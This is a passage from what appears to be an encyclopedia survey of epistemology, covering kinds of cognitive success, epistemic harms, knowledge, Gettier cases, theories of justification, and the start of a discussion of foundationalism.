In speaking , as we have just now , of the kinds of success that objects are “ supposed ” to enjoy , we have left it open in what sense the objects of cognitive success are “ supposed ” to enjoy their success : is it that their enjoyment of that success is good ?
( If so , then how is it good ? )
Or is it rather that their enjoyment of that success is required ?
( If so , then what requires it , and why ? )
We turn to that general topic next .
1.2 Constraints and Values
Some kinds of cognitive success involve compliance with a constraint , while others involve the realization or promotion of values .
We can contrast these two kinds of success by contrasting the associated kinds of failure : failure to comply with a constraint results in impermissibility , whereas failure to realize some values results in sub-optimality .
[ 8 ]
Of course , if sub-optimality is always impermissible and vice versa , then the extension of these two categories ends up being the same , even if the two categories are not themselves the same .
But it is implausible to regard all sub-optimality as epistemically impermissible : cognitive success does not require us to be perfectly cognitively optimal in every way .
If cognitive success is ever achievable even in principle , then at least some degree of cognitive sub-optimality must be permissible .
Achieving greater optimality than what ’s required for cognitive permissibility could then be understood as cognitive supererogation .
If such supererogation is possible , at least in principle , then the permissible can fall short of the optimal .
Recent controversies concern not merely the relation between permissibility and optimality , but also the metaphysical basis of each kind of success .
In virtue of what is some state , or act , or process , or relation , epistemically permissible ?
And in virtue of what is it optimal to whatever degree it is ?
Epistemic consequentialists take the answer to the former question to be determined by appeal to the answer to the latter .
For instance , one popular form of epistemic consequentialism claims that a particular way of forming one ’s beliefs about the world is epistemically permissible just in so far as it promotes the possession of true belief and the avoidance of false belief . [ 9 ]
Another form of consequentialism , consistent with but distinct from the first , says that a “ credence function ” ( i.e. , a function from propositions to degrees of confidence ) is optimal just in so far as it promotes a single parameter — overall accuracy — which is measured in such a way that , the higher one ’s confidence in true propositions and the lower one ’s confidence in false propositions , the greater one ’s overall accuracy . [ 10 ]
There are also some forms of epistemic consequentialism according to which optimality involves promotion of ends that are practical rather than simply alethic . [ 11 ]
An important controversy in the recent literature concerns the question of whether epistemic consequentialism is true ( see Berker 2013 , which develops a line of argument found in Firth 1978 [ 1998 ] ) .
Another prominent controversy is carried on among consequentialists themselves , and concerns the question of what values are such that their realization or promotion constitutes optimality .
We ’ve used the term “ constraint ” to denote the bounds of what is epistemically permissible .
Of course , as a matter of deontic logic , what is permissible must include at least what is required : for a condition to be required is simply for the complement of that condition to not be permissible .
But this leaves it open whether , in a particular domain , what is permissible includes more than what is required .
Permissivists argue that it does ( see Schoenfield 2014 for a defense of permissivism ) , while anti-permissivists argue that it does not ( see White 2005 and Schultheis 2018 for arguments against permissivism ) .
Anti-permissivists concerning constraints on our credences are sometimes described as holding a “ uniqueness ” view , but this label can easily mislead .
A philosopher who thinks that the range of permissible credences is no wider than the range of required credences is an anti-permissivist — but an anti-permissivist view , so understood , is consistent with the claim that the credences we are required to have are not point - valued but are rather interval - valued .
Such a philosopher could , for instance , claim that there is only one credence that you are permitted to assign to the proposition that the cat is on the mat , and this required credence is neither .6 nor .7 , but is rather the open interval ( .6 , .7 ) .
1.3 Substantive and Structural
Compare the following two rules :
( MP - Narrow )
If you believe that p is true , and you also believe that if p is true then q is true , then you ought to believe that q is true .
is true , and you also believe that if is true then is true , then you ought to believe that is true .
( MP - Wide )
You ought not be such that you believe that p is true , and believe that if p is true then q is true , and not believe that q is true .
The first rule , MP - Narrow , is obviously not a rule with which we ought to comply : if q is obviously false , then it ’s not the case that I ought to believe that q is true — not even if I believe that p is true , and that if p is true then q is true .
Nonetheless , if q is obviously false , then ( perhaps ) I ought not both believe that p is true and also believe that if p is true then q is true .
That ’s because , even if MP - Narrow is not a rule with which we ought to comply , MP - Wide may still be such a rule .
The difference between the two rules is in the scope of the “ ought ” : in MP - Narrow , its scope includes only one belief ( viz. , the belief that q is true ) , whereas in MP - Wide , its scope includes a combination of two beliefs ( viz. , that p is true , and that if p is true then q is true ) and one lack of belief ( viz. , that q is true ) .
This linguistic distinction between wide scope and narrow scope “ oughts ” is one expression of a general metaphysical distinction between two kinds of cognitive success .
On one side of this distinction are those kinds of cognitive success that qualify particular objects , e.g. , a particular belief , or a particular procedure , or a particular credence function , or a particular research program .
Examples of such success include a belief ’s being justified , a procedure ’s being rationally required , a credence function ’s being optimal .
In each case , some object enjoys a particular cognitive success , and this success obtains by virtue of various features of that object : the features in question may be intrinsic or relational , synchronic or diachronic , biological or phenomenological , etc .
We can call such cognitive successes “ substantive ” .
On the other side of this distinction are those kinds of cognitive success that qualify the relations between various things , each of which is itself individually assessable for cognitive success : e.g. , the relation between a set of beliefs all held by the same agent at a particular time , or the relation between the use of a particular procedure , on the one hand , and one ’s beliefs about that procedure , on the other , or the relation between an agent ’s credence function just before receiving new evidence , and her credence function just after receiving new evidence .
Examples of this latter kind of success include an agent ’s beliefs at a moment all being consistent , or the coherence between the procedures an agent uses and her beliefs about which procedures she ought to use .
In each case , a particular cognitive success qualifies the relations among various objects , quite independently of whether any particular one of those objects itself enjoys substantive cognitive success .
We can call such cognitive successes “ structural ” .
Some epistemologists have attempted to reduce substantive successes of a particular kind to structural successes . [ 12 ]
Others have attempted to reduce structural successes of some kind to substantive ones ( see , for instance , Kiesewetter 2017 , Lasonen - Aarnio forthcoming , and Lord 2018 ) .
And still others have denied that any such reduction is possible in either direction ( see , for instance , Worsnip 2018 and Neta 2018 ) .
In recent years , this controversy has been most active in connection with rational permissibility of beliefs , or of credences .
But such a controversy could , in principle , arise concerning any of the varieties of cognitive success that we ’ve distinguished so far .
1.4 . What Explains What ?
Many epistemologists attempt to explain one kind of cognitive success in terms of other kinds .
For instance , Chisholm tries to explain all cognitive success notions in terms of just one primitive notion : that of one attitude being more reasonable than another , for an agent at a time ( see Chisholm 1966 ) .
Williamson , in contrast , treats knowledge of facts as an explanatory primitive , and suggests that other kinds of cognitive success be explained in terms of such knowledge ( see Williamson 2002 ) .
Several prominent philosophers treat the notion of a normative reason as primitive ( see Scanlon 1998 ) .
And so on .
In each case , what is at issue is which kinds of cognitive success are explicable in terms of which other kinds of cognitive success .
Of course , whether this issue is framed as an issue concerning the explication of some concepts in terms of other concepts , or in terms of the grounding of some properties by other properties , or in some other terms still , depends on the metaphilosophical commitments of those framing the issue .
The issue of which kinds of cognitive success explain which other kinds of cognitive success is orthogonal to the issue of which particular cognitive successes explain which other particular cognitive successes .
The former issue concerns whether , for instance , the property of knowledge is to be explained in terms of the relation of one thing being a reason for another , or whether the relation of being a reason for is to explained in terms of knowledge .
But the latter issue concerns whether , for instance , I am justified in holding some particular belief — say , that the cat is on the mat — in virtue of my knowing various specific things , e.g. , that my vision is working properly under the present circumstances , and that the object that I am looking at now is a cat , etc .
This latter issue is at the heart of various epistemological regress puzzles , and we will return to it below .
But those regress puzzles are largely independent of the issue of metaphysical priority being discussed here .
1.5 What Makes It Success ?
What makes it the case that something counts as a form of cognitive success ?
For instance , why think that knowing the capital of Pakistan is a cognitive success , rather than just another cognitive state that an agent can occupy , like having 70 % confidence that Islamabad is the capital of Pakistan ?
Not every cognitive state enjoys cognitive success .
Knowing , understanding , mastering — these are cognitive successes .
But being 70 % confident in a proposition is not , in and of itself , a cognitive success , even if that state of confidence may be partly constitutive of an agent ’s cognitive success when the agent holds it in the right circumstances and for the right reason .
What makes the difference ?
Recent work on this issue tends to defend one of the following three answers to this question : contractualism , consequentialism , or constitutivism .
The contractualist says that a particular cognitive state counts as a kind of success because the practice of so counting it serves certain widely held practical interests .
For instance , according to Craig ( 1990 ) , we describe a person as “ knowing ” something as a way of signaling that her testimony with respect to that thing is to be trusted .
The consequentialist says that a particular cognitive state counts as a kind of success because it tends to constitute or tends to promote some crucial benefit .
According to some consequentialists , the benefit in question is that of having true beliefs and lacking false beliefs ( see BonJour 1985 , Audi 1993 ) .
According to others , it is the benefit of having a comprehensive understanding of reality .
According to others , it is a benefit that is not narrowly epistemic , e.g. , living a good life , or being an effective agent , or spreading one ’s gene pool .
Finally , the constitutivist may say that a particular cognitive state counts as a kind of success if it is the constitutive aim of some feature of our lives to achieve that state ( see Korsgaard 2009 for a defense of constitutivism concerning norms of rationality ) .
For instance , the constitutivist might say that knowledge is a kind of cognitive success by virtue of being the constitutive aim of belief , or that understanding is a kind of cognitive success by virtue of being the constitutive aim of reasoning , or that practical wisdom is a kind of cognitive success by virtue of being the constitutive aim of all human activity .
Of course , there are philosophers who count as “ constitutivists ” by virtue of thinking , say , that knowledge is the constitutive aim of belief — but these same philosophers are not thereby committed to the constitutivism described here , since they are not committed to this explanation of what makes knowledge a kind of cognitive success .
Of course , it ’s possible that one of the three answers mentioned above is correct for some kinds of success , while another of the three answers is correct for other kinds of success .
Consider , for instance , the difference between the kind of success involved in having a state that is fitting ( for instance , holding a belief knowledgeably ) , and the kind of success involved in having a state that is valuable ( for instance , holding a belief the holding of which is beneficial ) .
Perhaps the constitutivist can explain the former kind of success better than the consequentialist can , but the consequentialist can explain the latter kind of success better than the constitutivist can .
Of course , if and when the demands of these different kinds of success conflict , the agent will face the question of how to proceed .
Much recent work in epistemology has attempted to adjudicate that question , or to interrogate the assumption of possible conflict that gives rise to it ( see , for instance , Marušić 2015 , McCormick 2015 , and Rinard 2017a and 2019 b ) .
These different ways of understanding cognitive success each give rise to a different understanding of the range of ways in which cognitive success can be obstructed , and so a different understanding of the range in which agents may be harmed , and sometimes even wronged , by such obstructions .
For instance , on the contractualist view , epistemic harms may be built into the terms of the “ contract ” .
That is to say , such harms may be done not merely by the specific ways in which we interpret or implement our practice of epistemic appraisal , but rather in the fundamental features of that practice itself .
For instance , a practice that grants the status of knowledge to a belief formed on the basis of clearly conceptualized sense perception , but not to a belief formed on the basis of a less clearly conceptualized sense of a personal need , is a practice that systematically discredits beliefs formed by exercises of empathy , relative to beliefs formed in other ordinary ways . [ 13 ]
1.6 Epistemic Harms and Epistemic Wrongs
Obstructing an agent ’s cognitive success constitutes an epistemic harm .
Wrongly obstructing an agent ’s cognitive success constitutes an epistemic wrong .
In a situation in which false testimony would be an epistemic harm , dishonest testimony would be an epistemic wrong .
But the range of epistemic harms and epistemic wrongs can be much broader than those involving falsehood and deception .
Insinuation , inattention , and indoctrination can all constitute epistemic harms or epistemic wrongs : each one can obstruct , and sometimes wrongly obstruct , an agent ’s cognitive success .
For instance , I can mislead you into drawing false conclusions , even if what I say is true : for instance , when I say “ the victims were killed by an immigrant ” , even if what I say is literally true , it can mislead my hearer into thinking that the killer ’s being an immigrant was in some way explanatorily relevant to her crime .
Alternatively , I can harm you , and perhaps even wrong you , by getting you to think poorly of your own capacity to grasp a subject by not paying attention to what you think or say .
And finally , I can harm you , and perhaps even wrong you , by indoctrinating you in a view so strongly that you lose the ability to consider alternative views .
The epistemic harms and wrongs that we ’ve just mentioned occur frequently in the course of daily life , and they are typically constituted by some particular act that we perform ( e.g. , lending greater credence to the word of a man over that of a woman , or using rhetorical devices to insinuate things that one does n’t know to be true ) .
But some of these harms and wrongs are constituted not by any particular act , but rather by the procedures that give rise to those acts : for instance , when a research program in the life sciences implicitly assumes an ideologically - driven conception of human nature ( see Longino 1990 and Anderson 2004 for fascinating case studies ) .
And sometimes , the harms and wrongs might even be built into our practice of epistemic appraisal — perhaps even a tendency that is somehow constitutive of that very practice .
Suppose , for instance , that it is constitutive of our practice of epistemic appraisal to count someone as knowing a fact only if they possess concepts adequate to conceptualize that fact .
Whatever may be said in favor of our practice ’s having such a feature , one of its effects is clear : those individuals who are cognitively most sensitive to facts for which adequate conceptual resources have not yet been devised ( e.g. , someone living long before Freud who is sensitive to facts about repression , or someone living in the nineteenth century who is sensitive to facts about sexual harassment ) will find that the deliverances of their unique cognitive sensitivities are not counted as knowledge .
And so , these same individuals will not be granted the same authority or credibility as other individuals , even when those latter are less cognitively sensitive to the range of facts in question .
Recent work in feminist epistemology has helped us to gain an appreciation of just how widespread this phenomenon is ( see the seminal discussion of epistemic injustice in M. Fricker 2007 , and the development of that account in Dotson 2014 ) .
2 . What is Knowledge ?
Knowledge is among the many kinds of cognitive success that epistemology is interested in understanding .
Because it has attracted vastly more attention in recent epistemology than any other variety of cognitive success , we devote the present section to considering it in some detail .
But the English word “ knowledge ” lumps together various states that are distinguished in other languages : for instance , the verb “ to know ” can be translated into French either as “ connaitre ” or as “ savoir ” , and the noun “ knowledge ” can be translated into Latin as either “ cognitio ” or as “ scientia ” .
Exactly how to individuate the various kinds of cognitive success is not something that can be determined solely by appeal to the lexicon of any particular natural language .
The present section provides a brief survey of some of the kinds of cognitive success that are indicated by the use of “ knowledge ” in English , but this is not intended to signal that these kinds of cognitive success are all species of some common genus .
Neither , however , is it intended to signal that these kinds of cognitive success are not all species of some common genus : at least some philosophers have taken there to be a genus , awareness , of which the various kinds of knowledge are all species , and with respect to which these various kinds may all be explained ( see Silva 2019 for a defense of “ awareness first ” epistemology ) .
2.1 Knowing Individuals
Even if you know many facts about Napoleon , it does n’t follow that you know Napoleon .
You could n’t ever have known Napoleon , since he died long before you were born .
But , despite not having ever known Napoleon , you could still know a great many facts about Napoleon — perhaps you know even more facts about Napoleon than did those who knew him most intimately .
This shows that knowing a person is not the same as knowing a great many facts about the person : the latter is not sufficient for the former .
And perhaps the former is not even sufficient for the latter , since I might know my next door neighbor , and yet not realize that he is an undercover agent , and that almost everything he tells me about himself is false .
Knowing a person is a matter of being acquainted with that person , and acquaintance involves some kind of perceptual relation to the person .
What kind of perceptual relation ?
Clearly , not just any perceptual relation will do : I see and hear thousands of people while walking around a bustling city , but it does n’t follow that I am acquainted with any of them .
Must acquaintance involve an ability to distinguish that individual from others ?
It depends upon what such an ability amounts to .
I am acquainted with my next door neighbor , even though , in some sense , I cannot distinguish him from his identical twin : if they were together I could n’t tell who was who .
Just as we can be acquainted with a person , so too can we be acquainted with a city , a species of bird , a planet , 1960s jazz music , Watson and Crick ’s research , transphobia , and so on .
If it ’s not clear precisely what acquaintance demands in the case of people , it ’s even less clear what it demands across all of these various cases .
If there is a genus of cognitive success expressed by the verb “ to know ” with a direct object , or by the French “ connaitre ” , we have not yet understood that genus .
2.2 Knowing How
In his groundbreaking book , The Concept of Mind , Gilbert Ryle argued that knowing how to do something must be different from knowing any set of facts .
No matter how many facts you might know about swimming , say , it does n’t follow from your knowledge of these facts that you know how to swim .
And , of course , you might know how to swim even without knowing very many facts about swimming .
For Ryle , knowing how is fundamentally different from knowing that .
This Rylean distinction between knowing how and knowing that has been prominently challenged , beginning in 1975 with the publication of Carl Ginet ’s Knowledge , Perception , and Memory .
Ginet argued that knowing how to do something was simply knowing that a particular act was a way to do that thing .
This challenge was extended and systematized by Boër and Lycan ( 1975 ) , who argued that knowing who , knowing which , knowing why , knowing where , knowing when , and knowing how — all of the varieties of knowing wh- , as they called it — were all just different forms of knowing that .
To know who is F , for instance , was simply to know that a particular person is F .
To know why p is simply to know that a particular thing is the reason why p .
And to know how to F was simply to know that a particular act is a way to F .
This view was elaborated in considerable detail by Stanley and Williamson 2001 , and then challenged or refined by many subsequent writers ( see , for instance , the essays in Bengson and Moffett 2011 , and also Pavese 2015 and 2017 ) .
2.3 Knowing Facts
Whenever a knower ( S ) knows some fact ( p ) , several conditions must obtain .
A proposition that S does n’t even believe cannot be , or express , a fact that S knows .
Therefore , knowledge requires belief . [ 14 ]
False propositions cannot be , or express , facts , and so can not be known .
Therefore , knowledge requires truth .
Finally , S ’s being correct in believing that p might merely be a matter of luck .
For example , if Hal believes he has a fatal illness , not because he was told so by his doctor , but solely because as a hypochondriac he can’t help believing it , and it turns out that in fact he has a fatal illness , Hal ’s being right about this is merely accidental : a matter of luck ( bad luck , in this case ) . [ 15 ]
Therefore , knowledge requires a third element , one that excludes the aforementioned luck , and so that involves S ’s belief being , in some sense , justifiably or appropriately held .
If we take these three conditions on knowledge to be not merely necessary but also sufficient , then : S knows that p if and only if p is true and S justifiably believes that p.
According to this account , the three conditions — truth , belief , and justification — are individually necessary and jointly sufficient for knowledge of facts . [ 16 ]
Recall that the justification condition is introduced to ensure that S ’s belief is not true merely because of luck .
But what must justification be , if it can ensure that ?
It may be thought that S ’s belief that p is true not merely because of luck when it is reasonable or rational , from S ’s own point of view , to take p to be true .
Or it may be thought that S ’s belief is true not merely because of luck if that belief has a high objective probability of truth , that is , if it is formed or sustained by reliable cognitive processes or faculties .
But , as we will see in the next section , if justification is understood in either of these ways , it can not ensure against luck .
It turns out , as Edmund Gettier showed , that there are cases of JTB that are not cases of knowledge .
JTB , therefore , is not sufficient for knowledge .
Cases like that — known as Gettier cases [ 17 ] — arise because neither the possession of adequate evidence , nor origination in reliable faculties , nor the conjunction of these conditions , is sufficient for ensuring that a belief is not true merely because of luck .
Consider the well - known case of barn - facades :
Henry drives through a rural area in which what appear to be barns are , with the exception of just one , mere barn facades .
From the road
Henry is driving on , these facades look exactly like real barns .
Henry happens to be looking at the one and only real barn in the area and believes that there ’s a barn over there .
So Henry ’s belief is true , and furthermore his visual experience makes it reasonable , from his point of view , to hold that belief .
Finally , his belief originates in a reliable cognitive process : normal vision of ordinary , recognizable objects in good lighting .
Yet Henry ’s belief is true in this case merely because of luck : had Henry noticed one of the barn - facades instead , his belief would have been false .
There is , therefore , broad agreement among epistemologists that Henry ’s belief does not qualify as knowledge . [ 18 ]
To state conditions that are jointly sufficient for knowledge , what further element must be added to JTB ?
This is known as the Gettier problem .
Some philosophers attempt to solve the Gettier problem by adding a fourth condition to the three conditions mentioned above , while others attempt to solve it by either replacing or refining the justification condition .
How we understand the contrast between replacing the justification condition and refining it depends , of course , on how we understand the justification condition itself , which is the topic of the next section .
Some philosophers reject the Gettier problem altogether : they reject the aspiration to understand knowledge by trying to add to JTB .
Some such philosophers try to explain knowledge in terms of virtues : they say that to know a fact is for the truth of one ’s belief to manifest epistemic virtue ( see Zagzebski 1996 and Sosa 1997 ) .
Other such philosophers try to explain knowledge by identifying it as a genus of many familiar species : they say that knowledge is the most general factive mental state operator ( see Williamson 2002 ) .
And still other such philosophers try to explain knowledge by explaining its distinctive role in some other activity .
According to some , to know a fact is for that fact to be a reason for which one can do or think something . [ 19 ]
According to others , to know a fact is to be entitled to assert that fact ( see Unger 1975 , Williamson 2002 , DeRose 2002 for defenses of this view ; see Brown 2008 b and 2010 for dissent ) .
According to still others , to know a fact is to be entitled to use it as a premise in reasoning ( see Hawthorne & Stanley 2008 for defense of this view ; see Neta 2009 and Brown 2008a for dissent ) .
And according to still others , to know a fact is to be a trustworthy informant concerning whether that fact obtains .
Finally , there are those who think that the question “ what is it to know a fact ? ” is misconceived : the verb “ to know ” does not do the work of denoting anything , but does a different kind of work altogether , for instance , the work of assuring one ’s listeners concerning some fact or other , or the work of indicating to one ’s audience that a particular person is a trustworthy informant concerning some matter ( see Lawlor 2013 for an articulation of the assurance view , and Craig 1990 for an articulation of the trustworthy informant view ) .
3 . What is Justification ?
Whatever precisely is involved in knowing a fact , it is widely recognized that some of our cognitive successes fall short of knowledge : an agent may , for example , conduct herself in a way that is intellectually unimpeachable , and yet still end up thereby believing a false proposition .
Julia has every reason to believe that her birthday is July 15 : it says so on her birth certificate and all of her medical records , and everyone in her family insists that it is July 15 .
Nonetheless , if all of this evidence is the result of some time - keeping mistake made at the time of her birth , her belief about her birthday could be false , despite being so thoroughly justified .
Debates concerning the nature of justification [ 20 ] can be understood as debates concerning the nature of such non-knowledge - guaranteeing cognitive successes as the one that Julia enjoys in this example . [ 21 ]
3.1 Deontological and Non-Deontological Justification
How is the term “ justification ” used in ordinary language ?
Here is an example : Tom asked Martha a question , and Martha responded with a lie .
Was she justified in lying ?
Jane thinks she was , for Tom ’s question was an inappropriate one , the answer to which was none of Tom ’s business .
What might Jane mean when she thinks that Martha was justified in responding with a lie ?
A natural answer is this :
She means that Martha was under no obligation to refrain from lying .
Due to the inappropriateness of Tom ’s question , it was n’t Martha ’s duty to tell the truth .
This understanding of justification , commonly labeled deontological , may be defined as follows : S is justified in doing x if and only if S is not obliged to refrain from doing x. [ 22 ]
If , when we apply the word justification not to actions but to beliefs , we mean something analogous , then the following holds :
Deontological Justification ( DJ )
S is justified in believing that p if and only if S is not obliged to refrain from believing that p. [ 23 ]
What kind of obligations are relevant when we wish to assess whether a belief , rather than an action , is justified or unjustified ?
Whereas when we evaluate an action , we are interested in assessing the action from either a moral or a prudential point of view , when it comes to beliefs , what matters may be something else , [ 24 ] e.g. , the pursuit of truth , or of understanding , or of knowledge .
Exactly what , though , must we do in the pursuit of some such distinctively epistemic aim ?
According to one answer , the one favored by evidentialists , we ought to believe in accord with our evidence . [ 25 ]
For this answer to be helpful , we need an account of what our evidence consists of , and what it means to believe in accord with it .
Other philosophers might deny this evidentialist answer , but still say that the pursuit of the distinctively epistemic aims entails that we ought to follow the correct epistemic norms .
If this answer is going to help us figure out what obligations the distinctively epistemic aims impose on us , we need to be given an account of what the correct epistemic norms are . ] [ 26 ]
The deontological understanding of the concept of justification is common to the way philosophers such as Descartes , Locke , Moore and Chisholm have thought about justification .
Recently , however , two chief objections have been raised against conceiving of justification deontologically .
First , it has been argued that DJ presupposes that we can have a sufficiently high degree of control over our beliefs .
But beliefs — this objection alleges — are akin not to actions but rather things such as digestive processes , sneezes , or involuntary blinkings of the eye .
The idea is that beliefs simply arise in or happen to us .
Therefore , beliefs are not suitable for deontological evaluation ( see Alston 1985 & 1988 ; also , see Chrisman 2008 ) .
To this objection , some advocates of DJ have replied that lack of control over our beliefs is no obstacle to thinking of justification as a deontological status ( see R. Feldman 2001a ) .
Other advocates of DJ have argued that we enjoy no less control over our beliefs than we do over our intentional actions ( see Ryan 2003 ; Sosa 2015 ; Steup 2000 , 2008 , 2012 , 2017 ; and Rinard 2019 b ) .
According to the second objection to DJ , deontological justification cannot suffice for an agent to have a justified belief .
This claim is typically supported by describing cases involving either a benighted , culturally isolated society or subjects who are cognitively deficient .
Such cases involve subjects whose cognitive limitations make it the case that they are under no obligation to refrain from believing as they do , but whose limitations nonetheless render them incapable of forming justified beliefs ( for a response to this objection , see Steup 1999 ) .
Those who reject DJ think of justification not deontologically , but rather as a property that that a belief has when it is , in some sense , sufficiently likely to be true . [ 27 ]
We may , then , define justification as follows :
Sufficient Likelihood Justification ( SLJ )
S is justified in believing that p if and only if S believes that p in a way that makes it sufficiently likely that her belief is true .
If we wish to pin down exactly what the likelihood at issue amounts to , we will have to deal with a variety of tricky issues . [ 28 ]
For now , let us just focus on the main point .
Those who prefer SLJ to DJ would say that sufficient likelihood of truth and deontological justification can diverge : it ’s possible for a belief to be deontologically justified without being sufficiently likely to be true .
This is just what cases involving benighted cultures or cognitively deficient subjects are designed to show ( for elaboration on the non-deontological concept of justification , see Alston 1988 ) .
3.2 What Justifies Belief ?
What makes a belief that p justified , when it is ?
Whether a belief is justified or unjustified , there is something that makes it so .
Let ’s call the things that make a belief justified or unjustified J - factors .
Which features of a belief are J - factors ?
According to “ evidentialists ” , it is the believer ’s possession of evidence for p .
What is it , though , to possess evidence for p ?
Some evidentialists ( though not all ) would say it is to be in an experience that presents p as being true .
According to these evidentialists , if the coffee in your cup tastes sweet to you , then you have evidence that the coffee is sweet .
If you feel a throbbing pain in your head , you have evidence that you have a headache .
If you have a memory of having had cereal for breakfast , then you have evidence about what you had for breakfast .
And when you clearly “ see ” or “ intuit ” that the proposition “ If Jack had more than four cups of coffee , then Jack had more than three cups of coffee ” is true , then you have evidence for that proposition .
On this view , evidence consists of perceptual , introspective , memorial , and intuitional experiences , and to possess evidence is to have an experience of that kind .
So according to this “ experientialist ” version of evidentialism , what makes you justified in believing that p is your having an experience that represents p as being true ( see Conee and Feldman 2008 and McCain 2014 for defenses of such a view ) .
Other versions of evidentialism might identify other factors as your evidence , but would still insist that those factors are the J - factors .
Evidentialism is often contrasted with reliabilism , which is the view that a belief is justified by resulting from a reliable source , where a source is reliable just in case it tends to result in mostly true beliefs .
Reliabilists , of course , can also grant that the experiences mentioned in the previous paragraph can matter to the justification of your beliefs .
However , they deny that justification is essentially a matter of having suitable experiences .
Rather , they say , those experiences matter to the justification of your beliefs not merely by virtue of being evidence in support of those beliefs , but more fundamentally , by virtue of being part of the reliable source of those beliefs .
Different versions of reliabilism have been defended : some philosophers claim that what justifies a belief is that it is produced by a process that is reliable ( for instance , see Goldman 1986 ) , others claim that what justifies a belief is that it is responsive to grounds that reliably covary with the the truth of that belief , other claim that what justifies a belief is that it is formed by the virtuous exercise of a capacity , and so on .
3.3 Internal vs. External
Consider a science fiction scenario concerning a human brain that is removed from its skull , kept alive in a vat of nutrient fluid , and electrochemically stimulated to have precisely the same total series of experiences that you have had .
Call such a brain a “ BIV ” : a BIV would believe everything that you believe , and would ( it is often thought ) be justified in believing those things to precisely the same extent that you are justified in believing them .
Therefore , justification is determined solely by those internal factors that you and your envatted brain doppelganger share .
This view is what has come to be called “ internalism ” about justification . [ 29 ]
Externalism is simply the denial of internalism .
Externalists say that what we want from justification is the kind of likelihood of truth needed for knowledge , and the internal conditions that you share with your BIV doppelganger do not generate such likelihood of truth .
So justification involves external conditions . [ 30 ]
Among those who think that justification is internal , there is no unanimity on how to understand the notion of internality — i.e. , what it is about the factors that you share with your BIV doppelganger that makes those factors relevant to justification .
We can distinguish between two approaches .
According to the first , justification is internal because we enjoy a special kind of access to J - factors : they are always recognizable on reflection . [ 31 ]
Hence , assuming certain further premises ( which will be mentioned momentarily ) , justification itself is always recognizable on reflection . [ 32 ]
According to the second approach , justification is internal because J - factors are always mental states ( see Conee and Feldman 2001 ) .
Let ’s call the former accessibility internalism and the latter mentalist internalism .
Evidentialism is typically associated with internalism of at least one of these two varieties , and reliabilism with externalism . [ 33 ]
Let us see why .
Evidentialism says , at a minimum , two things :
E1 What makes one justified in believing p is nothing over and above the evidence that one possesses .
E2 What evidence one possesses is fixed by one ’s mental states .
By virtue of E2 , evidentialism is an instance of mentalist internalism .
Whether evidentialism is also an instance of accessibility internalism is a more complicated issue .
The conjunction of E1 and E2 by itself implies nothing about the accessibility of justification .
But mentalist internalists who endorse the first principle below will also be committed to accessibility internalism , and evidentialists who also endorse the second principle below will be committed to the accessibility of justification :
Luminosity
One ’s own mind is cognitively luminous :
Whenever one is in a particular mental state , one can always recognize on reflection what mental states one is in , and in particular , one can always recognize on reflection what evidence one possesses . [ 34 ]
Necessity
The principles that determine what is evidence for what are a priori recognizable . [ 35 ]
Relying on a priori insight , one can therefore always recognize on reflection whether , or the extent , to which a particular body of evidence is evidence for p. [ 36 ]
Although E1 and E2 by themselves do not imply access internalism , their conjunction with Luminosity and Necessity may imply access internalism . [ 37 ]
Next , let us consider why reliabilism is an externalist theory .
Reliabilism says that the justification of one ’s beliefs is a function of the reliability of one ’s belief sources such as memorial , perceptual and introspective states and processes .
Even if the operations of the sources are mental states , their reliability is not itself be a mental state .
Therefore , reliabilists reject mentalist internalism .
Moreover , insofar as the reliability of one ’s belief sources is not itself recognizable by means of reflection , how could reflection enable us to recognize when such justification obtains ? [ 38 ]
Reliabilists who take there to be no good answer to this question also reject access internalism . [ 39 ]
4. The Structure of Knowledge and Justification
Anyone who knows anything necessarily knows many things .
Our knowledge forms a body , and that body has a structure : knowing some things requires knowing other things .
But what is this structure ?
Epistemologists who think that knowledge involves justification tend to regard the structure of our knowledge as deriving from the structure of our justifications .
We will , therefore , focus on the latter .
4.1 Foundationalism
According to foundationalism , our justified beliefs are structured like a building : they are divided into a foundation and a superstructure , the latter resting upon the former .
Beliefs belonging to the foundation are basic .
Beliefs belonging to the superstructure are nonbasic and receive justification from the justified beliefs in the foundation . [ 40 ]
Before we evaluate this foundationalist account of justification , let us first try to spell it out more precisely .
What is it for a justified belief to be basic ?
According to one approach , what makes a justified belief basic is that it does n’t receive its justification from any other beliefs .
The following definition captures this thought :
Doxastic Basicality ( DB )
S ’s justified belief that p is basic if and only if S ’s belief that p is justified without owing its justification to any of S ’s other beliefs .
Let ’s consider what would , according to DB , qualify as an example of a basic belief .
Suppose you notice ( for whatever reason ) someone ’s hat , and you also notice that that hat looks blue to you .
So you believe
( B) It appears to me that that hat is blue .
Unless something very strange is going on , ( B ) is an example of a justified belief .
DB tells us that ( B ) is basic if and only if it does not owe its justification to any other beliefs of yours .
So if ( B ) is indeed basic , there might be some item or other to which ( B ) owes its justification , but that item would not be another belief of yours .
We call this kind of basicality “ doxastic ” because it makes basicality a function of how your doxastic system ( your belief system ) is structured .
Let us turn to the question of where the justification that attaches to ( B ) might come from , if we think of basicality as defined by DB .
Note that DB merely tells us how ( B ) is not justified .
It says nothing about how ( B ) is justified .
DB , therefore , does not answer that question .
What we need , in addition to DB , is an account of what it is that justifies a belief such as ( B ) .
According to one strand of foundationalist thought , ( B ) is justified because it ca n’t be false , doubted , or corrected by others .
On such a view , ( B ) is justified because ( B ) carries with it an epistemic privilege such as infallibility , indubitability , or incorrigibility ( for a discussion of various kinds of epistemic privilege , see Alston 1971 [ 1989 ] ) .
Note that ( B ) is a belief about how the hat appears to you .
So ( B ) is a belief about a perceptual experience of yours .
According to the version of foundationalism just considered , a subject ’s basic beliefs are introspective beliefs about the subject ’s own mental states , of which perceptual experiences make up one subset .
Other mental states about which a subject can have basic beliefs may include such things as having a headache , being tired , feeling pleasure , or having a desire for a cup of coffee .
Beliefs about external objects cannot qualify as basic , according to this kind of foundationalism , for it is impossible for such beliefs to enjoy the kind of epistemic privilege necessary for being basic .
According to a different version of foundationalism , ( B ) is justified by some further mental state of yours , but not by a further belief of yours .
Rather , ( B ) is justified by the very perceptual experience that ( B ) itself is about : the hat ’s looking blue to you .
Let “ ( E ) ” represent that experience .
According to this alternative proposal , ( B ) and ( E ) are distinct mental states .
The idea is that what justifies ( B ) is ( E ) .
Since ( E ) is an experience , not a belief of yours , ( B ) can , according to DB , still be basic .
Let ’s call the two versions of foundationalism we have distinguished privilege foundationalism and experiential foundationalism .
Privilege foundationalism is generally thought to restrict basic beliefs so that beliefs about contingent , mind - independent facts cannot be basic , since beliefs about such facts are generally thought to lack the privilege that attends our introspective beliefs about our own present mental states , or our beliefs about a priori necessities .
